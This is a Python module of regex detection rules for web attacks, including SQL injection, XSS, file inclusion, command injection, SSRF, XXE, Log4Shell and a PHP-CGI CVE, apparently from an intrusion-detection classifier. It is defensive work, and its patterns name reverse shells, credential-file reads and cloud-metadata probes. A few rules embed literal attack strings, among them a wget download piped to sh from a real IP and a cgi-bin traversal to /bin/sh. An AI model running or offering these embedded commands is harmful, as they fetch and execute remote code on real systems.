"""Text attack-detection rules — group: web_injection.

Auto-relocated from classification/text_rules.py (Phase 2 / T8). The rule
literals are verbatim; edit rules here, not in the façade.
"""

import re


def register(add):
    add("SQLI", "sqli_union_select", r"union\s+(all\s+)?select\s")

    add("SQLI", "sqli_classic_tautology", r"['\"]?\s*or\s+['\"]?\d+['\"]?\s*=\s*['\"]?\d+")

    add("SQLI", "sqli_comment_terminate", r"['\"];\s*--")

    add(
        "SQLI",
        "sqli_stacked_query",
        r";\s*(select|insert|update|delete|drop|alter|create|exec|execute)\s",
    )

    add("SQLI", "sqli_sleep_benchmark", r"(sleep\s*\(\s*\d|benchmark\s*\(\s*\d|waitfor\s+delay)")

    add("SQLI", "sqli_information_schema", r"information_schema\.(tables|columns|schemata)")

    add(
        "SQLI",
        "sqli_extract_functions",
        r"(extractvalue|updatexml|load_file|into\s+(out|dump)file)\s*\(",
    )

    add("SQLI", "sqli_hex_concat", r"(concat|concat_ws|group_concat|char|chr|unhex|hex)\s*\(")

    add("SQLI", "sqli_logic_bypass", r"(having\s+\d|order\s+by\s+\d+--|group\s+by\s+\d+--)")

    add("SQLI", "sqli_mysql_comment_bypass", r"/\*!?\d*\s*(select|union|from|where|and|or)\b")

    add("SQLI", "sqli_pg_system_tables", r"(pg_catalog|pg_shadow|pg_user|pg_tables|pg_namespace)")

    add(
        "SQLI", "sqli_mssql_system", r"(sysobjects|syscolumns|xp_cmdshell|sp_executesql|openrowset)"
    )

    add("SQLI", "sqli_into_outfile", r"into\s+(out|dump)file\s")

    add("SQLI", "sqli_case_when", r"case\s+when\s+.*then\s")

    add("SQLI", "sqli_cast_convert", r"(cast|convert)\s*\(\s*\w+\s+as\s")

    add("XSS", "xss_script_tag", r"<\s*script[\s>]")

    add(
        "XSS",
        "xss_event_handler",
        r"\bon(error|load|click|mouseover|focus|blur|submit|change|"
        r"mouseout|mousemove|keyup|keydown|keypress|unload|resize|"
        r"abort|beforeunload|hashchange|pointerdown|animationend)\s*=",
    )

    add("XSS", "xss_javascript_proto", r"javascript\s*:")

    add("XSS", "xss_img_tag", r"<\s*img\b[^>]*\bon\w+\s*=")

    add("XSS", "xss_svg_tag", r"<\s*svg[\s/]")

    add("XSS", "xss_iframe_tag", r"<\s*iframe[\s>]")

    add("XSS", "xss_object_embed", r"<\s*(object|embed|applet)[\s>]")

    add("XSS", "xss_data_uri", r"data\s*:\s*(text/html|application/xhtml)")

    add(
        "XSS",
        "xss_expression_eval",
        r"(expression|eval|settimeout|setinterval|function|alert|"
        r"prompt|confirm|document\.(cookie|write|domain)|"
        r"window\.(location|open)|fromcharcode)\s*\(",
    )

    add("XSS", "xss_vbscript", r"vbscript\s*:")

    add("XSS", "xss_base64_inject", r"<[^>]+\bsrc\s*=\s*['\"]?\s*data:")

    add("LFI", "lfi_dotdot_slash", r"(\.\.[\\/]){2,}")

    add("LFI", "lfi_etc_passwd", r"/etc/(passwd|shadow|hosts|group|issue|motd|resolv\.conf)")

    add("LFI", "lfi_proc_self", r"/proc/(self|version|cmdline|environ)")

    add(
        "LFI",
        "lfi_windows_paths",
        r"(\\|/)windows(\\|/)(system32|win\.ini|boot\.ini|repair\\sam)",
        re.IGNORECASE,
    )

    add("LFI", "lfi_var_log", r"/var/log/(apache|nginx|syslog|auth\.log|messages|secure|mail)")

    add(
        "LFI",
        "lfi_null_byte",
        r"\.(php|asp|jsp|txt|html|inc|conf|ini|log|bak|old|orig|cfg)(%00|\x00)",
    )

    add("LFI", "lfi_encoded_traversal", r"(%2e%2e|%252e%252e|\.%00|%c0%ae|%c1%1c|%e0%80%ae)")

    add("LFI", "lfi_php_filter", r"php://(filter|input|data|expect|fd)")

    add("LFI", "lfi_zip_wrapper", r"zip://[^\s&]+(\.(zip|phar|jar))?(%23|#)")

    add(
        "SENSITIVE_FILE",
        "lfi_sensitive_config",
        r"(wp-config\.php|\.htaccess|\.env|config\.php|web\.config|"
        r"application\.properties|settings\.py|\.git/config)",
    )

    add("LFI", "lfi_ssh_keys", r"\.(ssh|gnupg)/(authorized_keys|id_rsa|known_hosts)")

    add(
        "RFI",
        "rfi_url_param",
        r"(include|require|require_once|include_once)\s*\(\s*['\"]?https?://",
    )

    add("RFI", "rfi_url_in_param", r"[?&]\w+=https?://\S+\.(php|asp|jsp|txt|pl|cgi)")

    add("RFI", "rfi_ftp_url", r"[?&]\w+=ftp://")

    add("RCE", "rce_chain_cat_ls", r"[a-zA-Z0-9_\"')\]=]\s*[;|]\s*(cat|ls|dir)\s+[/\w\-\.]")

    add(
        "RCE",
        "rce_chain_id_whoami",
        r"[a-zA-Z0-9_\"')\]=]\s*[;|]\s*(id|whoami|uname|hostname|pwd)\s*[;&|$\n\r]",
    )

    add(
        "RCE",
        "rce_chain_network",
        r"[a-zA-Z0-9_\"')\]=]\s*[;|]\s*(wget|curl|nc|ncat|netcat|telnet|ssh|ftp)\s+\S",
    )

    add(
        "RCE",
        "rce_chain_shell",
        r"[a-zA-Z0-9_\"')\]=]\s*[;|]\s*(bash|sh|zsh|ksh|csh|dash|fish)\s+[\-/\w]",
    )

    add(
        "RCE",
        "rce_chain_python",
        r"[a-zA-Z0-9_\"')\]=]\s*[;|]\s*(python[23]?|perl|ruby|php|node)\s+[\-/\w]",
    )

    add(
        "RCE",
        "rce_chain_dangerous",
        r"[a-zA-Z0-9_\"')\]=]\s*[;|]\s*(rm|chmod|chown|kill|pkill|reboot|shutdown|"
        r"useradd|userdel|passwd|mkfifo|mknod)\s+[\-/\w]",
    )

    add(
        "RCE",
        "rce_chain_admin",
        r"[a-zA-Z0-9_\"')\]=]\s*[;|]\s*(sudo|su|crontab|at|systemctl|service)\s+\S",
    )

    add("RCE", "rce_base64_pipe_shell", r"base64\s+(-d|--decode)\s*\|\s*(ba|z|k|da)?sh\b")

    add(
        "RCE",
        "rce_backtick_path_cmd",
        r"`\s*(cat|wget|bash|curl)\s+(-[a-zA-Z]+\s+)?[/a-zA-Z0-9_.]+`",
    )

    add("RCE", "rce_backtick_info_cmd", r"`\s*(uname|hostname|pwd)\s*(-[a-zA-Z]+)?`")

    add("RCE", "rce_backtick_echo", r"`\s*echo\s+['\"]?[a-zA-Z0-9_\-\s]+['\"]?`")

    add(
        "RCE",
        "rce_dollar_paren",
        r"\$\(\s*(cat|ls|id|whoami|curl|wget|bash|sh|python|perl|"
        r"ruby|php|nc|ncat|ping|nslookup|dig|echo|printf|awk|sed|head|tail|grep)\s",
    )

    add("RCE", "rce_bash_redirect", r"(bash|sh|zsh)\s+-[icx]\s+['\"]")

    add("RCE", "rce_bash_c_option", r"\b(bash|sh)\s+-c\s+['\"]")

    add("RCE", "rce_reverse_shell_bash", r"bash\s+-i\s+>&?\s*/dev/tcp/")

    add("RCE", "rce_reverse_shell_mkfifo", r"mkfifo\s+/tmp/\w+\s*;\s*(cat|nc)")

    add("RCE", "rce_reverse_shell_nc", r"nc\s+-[enlvp]+\s+[\d.]+\s+\d+\s+-e\s+/(bin|usr)")

    add(
        "RCE",
        "rce_reverse_shell_python",
        r"python[23]?\s+-c\s+['\"]import\s+(socket|subprocess|os)",
    )

    add("RCE", "rce_reverse_shell_perl", r"perl\s+-e\s+['\"].*socket.*exec")

    add("RCE", "rce_reverse_shell_ruby", r"ruby\s+-rsocket\s+-e")

    add("RCE", "rce_reverse_shell_socat", r"socat\s+\S*exec:")

    add("RCE", "rce_dev_tcp", r"/dev/(tcp|udp)/[\d.]+/\d+")

    add(
        "RCE",
        "rce_eval_exec",
        r"\b(eval|exec|system|passthru|popen|proc_open|shell_exec|"
        r"assert|preg_replace\s*/e)\s*\(['\"]",
    )

    add("RCE", "rce_cgi_bin", r"/cgi-bin/[\w\-]+\.(cgi|sh|pl|py)\?")

    add(
        "RCE",
        "rce_etc_passwd",
        r"(cat|head|tail|less|more|grep|awk|sed)\s+/etc/(passwd|shadow|group)",
    )

    add("RCE", "rce_etc_init", r"/etc/(init\.d|rc\.d|cron\.d)/\w+")

    add(
        "RCE",
        "rce_powershell",
        r"(powershell|pwsh)\s+(-enc|-encodedcommand|-command|-exec\s+bypass|" r"-nop|-w\s+hidden)",
        re.IGNORECASE,
    )

    add("RCE", "rce_windows_cmd", r"cmd\s*/c\s+[\w\"']", re.IGNORECASE)

    add(
        "RCE",
        "rce_windows_exec",
        r"(wscript|cscript|rundll32|regsvr32|mshta|certutil)\s+[\w/\\]",
        re.IGNORECASE,
    )

    add("RCE", "rce_curl_pipe", r"curl\s+\S+\s*\|\s*(bash|sh|python|perl)")

    add("RCE", "rce_wget_pipe", r"wget\s+\S+\s+-O\s*-\s*\|\s*(bash|sh)")

    add("RCE", "rce_curl_output", r"curl\s+.*-o\s+/tmp/\w+")

    add("RCE", "rce_python_import", r"python[23]?\s+-c\s+['\"]?\s*(import|__import__|exec|eval)")

    add("SHELLSHOCK", "rce_env_injection", r"\(\)\s*\{\s*:\s*;\s*\}\s*;")

    add(
        "RCE",
        "rce_param_injection",
        r"[?&](cmd|command|exec|run|system|shell|ping|query|execute|"
        r"func|function|option|load|read|write|process|action)=\s*[|;&`$]",
    )

    add("RCE", "rce_sleep_test", r"[;|&]\s*sleep\s+\d+\s*[;|&]")

    add("RCE", "rce_ping_test", r"[;|&]\s*ping\s+-[cn]\s+\d+\s+")

    add("RCE", "rce_hex_encoded", r"\\x(2f|62|69|6e|73|68)", re.IGNORECASE)  # /bin/sh in hex

    add("PHP", "php_opening_tag", r"<\?php\s")

    add(
        "PHP",
        "php_dangerous_funcs",
        r"\b(system|exec|passthru|shell_exec|popen|proc_open|"
        r"pcntl_exec|eval|assert|preg_replace\s*/e|"
        r"base64_decode|gzinflate|gzuncompress|str_rot13|"
        r"create_function|unserialize)\s*\(",
    )

    add("PHP", "php_wrapper_streams", r"(php://input|php://filter|expect://|data://text)")

    add("DESERIALIZE", "php_serialize_exploit", r"O:\d+:\"[A-Za-z_]+\":\d+:{")

    add(
        "SSTI",
        "ssti_jinja2",
        r"\{\{.*?(__class__|__mro__|__subclasses__|__import__|"
        r"__builtins__|__globals__|config\[)",
    )

    add("SSTI", "ssti_twig", r"\{\{.*?(_self\.env|registerUndefinedFilterCallback)")

    add("SSTI", "ssti_generic_expr", r"\$\{[^}]*(Runtime|getClass|forName|getMethod|invoke)\}")

    add("SSTI", "ssti_freemarker", r"<#assign\s.*?exec|new\s+freemarker")

    add("LOG4SHELL", "log4j_jndi_lookup", r"\$\{jndi:(ldap|rmi|dns|iiop|corba|nds|http)s?://")

    add(
        "LOG4SHELL",
        "log4j_jndi_obfuscated",
        r"\$\{(j|J)\s*\$?\{?.*?(n|N)\s*\$?\{?.*?(d|D)\s*\$?\{?.*?(i|I)\s*:",
    )

    add("LOG4SHELL", "log4j_nested_lookup_bypass", r"\$\{(?:\$\{[^}]{1,8}\}){2,}\s*:")

    add("LOG4SHELL", "log4j_env_lookup", r"\$\{(env|sys|main|ctx|lower|upper):[^}]+\}")

    # A URL pointing at an internal address is a classic SSRF probe — in a request
    # parameter. In a device-discovery announcement it is the device stating where it
    # lives, which is the opposite of an attack. WS-Discovery `Hello` carries
    # `<wsd:XAddrs>http://192.168.x.y:5357/...`, and in production that produced 227 SSRF
    # labels in 30 days — every single hit this rule scored, all of them wrong, while the
    # genuine SSRF traffic was caught by ssrf_cloud_metadata and ssrf_gopher_dict.
    #
    # The guard is a whole-payload negative lookahead anchored with \A, because the
    # discovery marker can sit either side of the URL. SSDP is included for the same
    # reason: its NOTIFY carries `LOCATION: http://192.168.x.y` and 2,959 such payloads
    # were already in the event store, kept out of this rule so far only by protocol gating.
    add(
        "SSRF",
        "ssrf_internal_ip",
        r"(?s)\A(?!.*(?:schemas\.xmlsoap\.org/ws/\d{4}/\d{2}/discovery|"
        r"<wsd:XAddrs|XAddrs>|urn:schemas-upnp-org|NOTIFY\s+\*\s+HTTP/1\.1))"
        r".*?(https?|gopher|dict|file)://(127\.\d+\.\d+\.\d+|"
        r"0\.0\.0\.0|10\.\d+\.\d+\.\d+|192\.168\.\d+\.\d+|"
        r"172\.(1[6-9]|2\d|3[01])\.\d+\.\d+|localhost|"
        r"\[::1?\]|0x7f|2130706433)",
    )

    add(
        "SSRF",
        "ssrf_cloud_metadata",
        r"(169\.254\.169\.254|metadata\.google\.internal|" r"100\.100\.100\.200|fd00:ec2::254)",
    )

    add("SSRF", "ssrf_gopher_dict", r"(gopher|dict|file)://")

    add(
        "SSRF",
        "ssrf_dns_rebind_domain",
        r"(https?|gopher|dict|ftp)://(?:[a-z0-9._-]+\.)?"
        r"(localtest\.me|nip\.io|sslip\.io|xip\.io|"
        r"lvh\.me|vcap\.me|fbi\.com|burpcollaborator\.net|oast\.(me|pro|live|site|online|fun))\b",
    )

    add("XXE", "xxe_entity_declaration", r"<!ENTITY\s+\w+\s+(SYSTEM|PUBLIC)\s+['\"]")

    add("XXE", "xxe_parameter_entity", r"<!ENTITY\s+%\s+\w+")

    add("XXE", "xxe_dtd_include", r"<!DOCTYPE\s+\w+\s+\[.*?<!ENTITY", re.DOTALL | re.IGNORECASE)

    add(
        "CRLF",
        "crlf_injection_encoded",
        r"%0[dD]%0[aA]\s*(Set-Cookie|Location|Content-Type|HTTP/\d|X-Forwarded|"
        r"X-XSS|Access-Control|Cache-Control|Pragma|Expires|Host|Transfer-Encoding)",
    )

    add("CRLF", "crlf_header_inject", r"%0[dD]%0[aA]\s*[\w\-]+\s*:")

    add("LDAPI", "ldap_injection_wildcard", r"[(&|][\w=]*\*\)")

    add("LDAPI", "ldap_injection_filter", r"\([\w]+=\*\)\s*\(\|")

    add("SHELLSHOCK", "shellshock_func_def", r"\(\)\s*\{\s*:;\s*\}")

    add("SHELLSHOCK", "shellshock_env_inject", r"\(\)\s*\{[^}]*\}\s*;")

    add(
        "SQLI",
        "nosql_mongo_operator",
        r"\{\s*['\"]?\$?(where|gt|gte|lt|lte|ne|in|nin|regex|exists)['\"]?\s*:",
        re.IGNORECASE,
    )

    add("SQLI", "nosql_mongo_js", r"\$where\s*:\s*['\"]?function\s*\(", re.IGNORECASE)

    add(
        "SQLI",
        "nosql_mongo_injection",
        r"(\{|\[)\s*['\"]?\$[a-zA-Z][a-zA-Z0-9_]*['\"]?\s*:",
        re.IGNORECASE,
    )

    add(
        "SQLI",
        "sqli_time_based_mysql",
        r"(sleep|benchmark|pg_sleep|waitfor\s+delay|dbms_lock\.sleep)\s*\(",
        re.IGNORECASE,
    )

    add(
        "SQLI",
        "sqli_error_based",
        r"(extractvalue|updatexml|exp\(~|geometrycollection)\s*\(",
        re.IGNORECASE,
    )

    add(
        "SQLI",
        "sqli_boolean_based",
        r"(and|or)\s+\d+\s*=\s*\d+|(['\"]\s*(and|or)\s*['\"]?\d)",
        re.IGNORECASE,
    )

    add(
        "SQLI",
        "sqli_json_value",
        r"['\"]value['\"]\s*:\s*['\"].*?(union|select|insert|delete|drop)\b",
        re.IGNORECASE,
    )

    add("SQLI", "sqli_orm_bypass", r"(\.where\(|\.filter\().*?['\"].*?(--|;|union)", re.IGNORECASE)

    add("XSS", "xss_dom_sink_inner", r"(innerHTML|outerHTML)\s*[+]?=", re.IGNORECASE)

    add("XSS", "xss_dom_sink_write", r"document\.(write|writeln)\s*\(", re.IGNORECASE)

    add("XSS", "xss_dom_eval", r"(eval|setTimeout|setInterval|Function)\s*\([^)]*\+", re.IGNORECASE)

    add(
        "XSS",
        "xss_angular_expression",
        r"\{\{.*?(constructor|__proto__|prototype)\s*[\[\(]",
        re.IGNORECASE,
    )

    add(
        "XSS",
        "xss_vue_template",
        r"v-(html|on:[a-z]+)\s*=\s*['\"].*?(constructor|__proto__)",
        re.IGNORECASE,
    )

    add("XSS", "xss_react_dangerously", r"dangerouslySetInnerHTML\s*=\s*\{\{", re.IGNORECASE)

    add(
        "XSS",
        "xss_polyglot_js_html",
        r"jaVasCript:\s*/\*|<svg/onload=|<img/src/onerror=",
        re.IGNORECASE,
    )

    add("XSS", "xss_svg_use", r"<svg[^>]*>.*?<use\s+href=", re.IGNORECASE | re.DOTALL)

    add("XSS", "xss_math_xlink", r"<math>.*?xlink:href=", re.IGNORECASE | re.DOTALL)

    add(
        "XSS", "xss_mutation_noscript", r"<noscript>.*?<(img|svg|iframe)", re.IGNORECASE | re.DOTALL
    )

    add("XSS", "xss_mutation_table", r"<table.*?background\s*=", re.IGNORECASE)

    add("XSS", "xss_csp_bypass_base", r"<base\s+href=", re.IGNORECASE)

    add("XSS", "xss_csp_bypass_meta", r"<meta\s+http-equiv=['\"]?refresh", re.IGNORECASE)

    add("LFI", "LFI_HTTP", r"""GET /..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1""")

    add("SENSITIVE_FILE", "LFI_HTTP_GET", r"""GET /.env HTTP/1.1""")

    add("LFI", "LFI_etc_passwd_access", r"""\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/etc\/passwd""")

    add("SENSITIVE_FILE", "Suspicious_LFI_.env_File_Access", r"""\bGET \/www\/.env\.swp\b""")

    add(
        "LFI",
        "claude_lfi_bash_history_traversal",
        r"""(\.\./){3,}.*?(\/root\/\.bash_history|\/home\/[^/]+\/\.bash_history|\.bash_history)""",
    )

    add(
        "LFI",
        "claude_lfi_directory_traversal_tmp_access",
        r"""\?[^=]*=(\.\./){4,}(tmp|etc|var|usr|home|proc)/[^\s&]*""",
    )

    add(
        "LFI",
        "claude_lfi_encoded_passwd_traversal",
        r"""(?i)(?:%2e%2e[/\\]|\.\.[\/\\]){1,}.*(?:etc[/\\]passwd|windows[/\\]system32|boot\.ini)""",
    )

    add("SENSITIVE_FILE", "claude_lfi_env_file_access", r"""GET\s+/?\.env(?:\?.*)?\s+HTTP""")

    add("SENSITIVE_FILE", "claude_lfi_git_config_access", r"""GET\s+/?\.git/config\s+HTTP/""")

    add(
        "RCE",
        "Custom_Exploit",
        r"""wget --no-check-certificate -qO- https://\d+\.57\.216\.121/sh | sh""",
    )

    add(
        "RCE",
        "Suspicious_HTTP_POST_request",
        r"""POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1""",
    )

    add("RCE", "Trojan_Download", r"""rm -rf /tmp/.*\.m""")

    add(
        "RCE",
        "claude_php_rce_shell_exec_injection",
        r"""(<\?php.*?shell_exec\s*\(|shell_exec\s*\(.*?echo.*?\|.*?md5sum)""",
    )

    add(
        "RCE",
        "claude_rce_php_fpm_fastcgi_cve_2019_11043",
        r"""PHP_ADMIN_VALUE.*allow_url_include\s*=\s*On.*auto_prepend_file\s*=\s*php://input|auto_prepend_file\s*=\s*php://input.*PHP_ADMIN_VALUE.*allow_url_include\s*=\s*On""",
    )

    add("RCE", "claude_rce_php_shell_exec_injection", r"""<?php.*shell_exec\(['"].*['"]\)""")

    # ---- CVE-2024-4577 — PHP-CGI argument injection ---------------------------
    # PHP 8.1.<29 / 8.2.<20 / 8.3.<8 on Windows with Apache + PHP-CGI. Windows
    # code-page conversion folds a soft hyphen (%AD / raw 0xAD) into "-", so the
    # query string smuggles CGI switches: `%ADd allow_url_include=1 %ADd
    # auto_prepend_file=php://input` makes PHP execute the request body.
    # Published 2024-06-09 (NVD, status Analyzed).
    #
    # Added 2026-08-27 after a real capture on a sensor was labelled with an
    # unrelated, PoC-less CVE purely because its base64 body was long. The
    # distinguishing mark is the soft hyphen next to a CGI switch — not the size.
    add(
        "RCE",
        "php_cgi_argument_injection_cve_2024_4577",
        r"(?:%ad|\xad)\s*d[+ %]{1,3}(?:allow_url_include|auto_prepend_file|cgi\.force_redirect)",
        re.IGNORECASE,
    )

    # The switch pair on its own, however it was smuggled. Both directives are
    # required: `auto_prepend_file` alone appears in legitimate php.ini dumps.
    add(
        "RCE",
        "php_cgi_include_prepend_pair",
        r"allow_url_include\s*(?:=|%3d)\s*1[^\n]{0,120}?auto_prepend_file\s*(?:=|%3d)\s*php://input",
        re.IGNORECASE,
    )
